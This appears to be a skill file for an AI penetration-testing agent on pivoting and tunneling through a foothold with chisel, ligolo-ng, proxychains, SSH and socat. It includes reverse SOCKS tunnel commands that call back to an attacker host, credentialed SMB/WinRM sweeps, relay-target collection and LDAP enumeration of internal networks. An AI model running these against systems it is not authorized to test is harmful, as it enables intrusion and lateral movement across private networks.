---
name: pivoting
description: Choose and set up pivots and tunnels - Chisel, ligolo-ng, proxychains, SSH tunnels, socat - to reach internal networks from a foothold. Use when a foothold sees networks the attacker cannot.
---

# Pivoting & Tunneling

## Choose the right primitive
| Need | Tool |
|---|---|
| Single port to a tool that needs localhost (RDP, web app) | `ssh -L` / `chisel` single forward / `socat` |
| Full network access for many tools | ligolo-ng (VPN-style) or `chisel` multi-forward |
| Route one command through the pivot | `proxychains4 <cmd>` (after ligolo/SOCKS is up) |
| Dynamic SOCKS from an SSH-capable host | `ssh -D 1080` |
| Relay/redirect on the pivot host itself | `socat TCP-LISTEN:...,fork TCP:...` |

## Procedure
1. From the foothold, enumerate what IT can reach: local listeners, adjacent
   subnets, DC/RDP/DB ports that time out from you but answer locally.
2. Confirm the pivot client can dial back to you (firewall/NAT direction!)
   before building the tunnel.
3. Bring up the tunnel, then **verify from the attacker side** (nmap one
   known-open and one known-closed port through it) before trusting scans.
4. Prefer ligolo/proxychains for scanner-heavy work; prefer explicit
   forwards for single services (more stable, less blast radius).

## Chisel quick reference
```bash
# attacker
chisel server -p 8080 --reverse
# target
chisel client <ATTACKER>:8080 R:socks
# then: proxychains4 nxc smb <internal-target> ...
```

## Network enumeration through a pivot
Once the tunnel is verified, scan the internal network methodically:
```bash
# Service discovery through SOCKS (proxychains)
proxychains4 nmap -sT -Pn -T4 -p 21,22,80,88,135,139,389,443,445,1433,3268,3389,5985 <subnet>/24
# nxc is faster for SMB/WinRM sweeps
proxychains4 nxc smb <subnet>/24 --gen-relay-list /workspace/loot/relay-targets.txt
proxychains4 nxc winrm <subnet>/24 -u <U> -p '<P>'
# LDAP enumeration through the pivot
proxychains4 ldapsearch -H ldap://<DC-IP> -D '<user>@<dom>' -w '<pass>' -b 'DC=...' '(objectClass=computer)' dNSHostName
```
Record discovered hosts: `note service '<ip>:<port> <service> [via pivot through <host>]'`.
Add each to the wiki: `wiki add hosts/<ip> '<what you found>'`.

## Multiple concurrent pivots
On a network with multiple segments (e.g. DMZ -> corporate -> server VLAN),
you may need layered pivots:
- **One chisel/ligolo per hop**: HOST-A (DMZ) tunnels to segment B, HOST-B
  (segment B) tunnels to segment C.
- **Port assignment**: use different SOCKS ports per pivot (1080, 1081, 1082)
  and match them in separate proxychains configs:
  ```bash
  cp /etc/proxychains4.conf /etc/proxychains4-seg2.conf
  # edit: socks5 127.0.0.1 1081
  proxychains4 -f /etc/proxychains4-seg2.conf nxc smb <seg2-target>
  ```
- **Chained proxychains**: for a double-hop, configure proxychains with two
  SOCKS entries (one per hop) — but this is fragile; prefer ligolo-ng with
  multiple agents or nested chisel tunnels.
- Track every active pivot on the board: `note pivot 'chisel :1080 via WEB01 -> 172.16.1.0/24'`.

## DNS resolution through pivots (critical for Kerberos/AD)
Kerberos, LDAP, and many AD tools REQUIRE hostnames, not IPs. Through a pivot:
1. Add internal hostnames to `/etc/hosts` on the attacker:
   ```bash
   echo "172.16.1.10 DC01.corp.local corp.local" >> /etc/hosts
   ```
2. Or point DNS through the pivot — set the DC as your nameserver:
   ```bash
   echo "nameserver 172.16.1.10" > /etc/resolv.conf
   ```
   (Only works if DNS traffic routes through the tunnel — ligolo handles this;
   chisel SOCKS needs `proxychains4 nslookup`.)
3. **Always verify resolution before running AD tools**:
   `proxychains4 nslookup DC01.corp.local 172.16.1.10`

## Gotchas
- Route the DC's IP explicitly through the tunnel if your OS has a direct
  route to the range that shadows it.
- Kerberos/LDAP through a pivot needs name resolution on the attacker side --
  add the hostname->internal-IP mapping locally, don't scan by IP and wonder
  why Kerberos fails.
- Keep one clean tunnel per purpose; a flaky multi-purpose tunnel makes every
  tool look broken.
- NAT forwards 80, 443, 445, 4444-4460, 8080-8090 to the container.
  Use 8080-8090 for chisel/ligolo tunnels.
